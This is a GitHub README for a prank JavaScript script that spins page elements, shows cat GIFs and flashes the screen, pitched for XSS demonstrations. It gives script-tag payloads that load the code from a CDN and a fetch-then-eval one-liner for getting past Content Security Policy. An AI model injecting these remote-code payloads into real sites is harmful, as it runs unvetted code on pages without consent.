# Website Spinning Chaos Script

![Spinning Cat](https://raw.githubusercontent.com/orlyjamie/spinningcat/refs/heads/main/cat.gif)

This repository contains a (reskinned) chaotic JavaScript script that:
- Plays an audio file of a cat song.  
- Spawns spinning ~~cat~~ CCX GIFs all over the page.  
- Flashes a neon green screen intermittently (warning).  
- Makes all elements on the page spin.  

Perfect for those handy XSS demonstrations, or just to vibe to in your free time!

---

## Usage

### 1. Direct Link
You can directly embed the script using this URL:


```html
<script src="https://cdn.jsdelivr.net/gh/carameljuni/spinningcat-cx@VERSION/cat.js"></script>
```
... or, for a biscuity *spin* on things:
``` html
<script src="https://cdn.jsdelivr.net/gh/carameljuni/spinningcat-cx@VERSION/gaiety.js"></script>
```

Replacing VERSION with the github's current version ID (e.g. `f6397a2`):

![](/12004.png)

### 2. Fetch and Execute Inline
If external scripts are blocked by CSP, try this:

```html
<script>fetch('https://cdn.jsdelivr.net/gh/carameljuni/spinningcat-cx@VERSION/cat.js').then(r=>r.text()).then(eval)</script>
```
or
``` html
<script>fetch('https://cdn.jsdelivr.net/gh/carameljuni/spinningcat-cx@VERSION/gaiety.js').then(r=>r.text()).then(eval)</script>
```

# Originally created by these wonderful folk, before i tweaked it a bit :3
https://x.com/theonejvo
https://www.linkedin.com/in/theonejvo/

Enjoy the chaos! 🐱🎶💚🔄
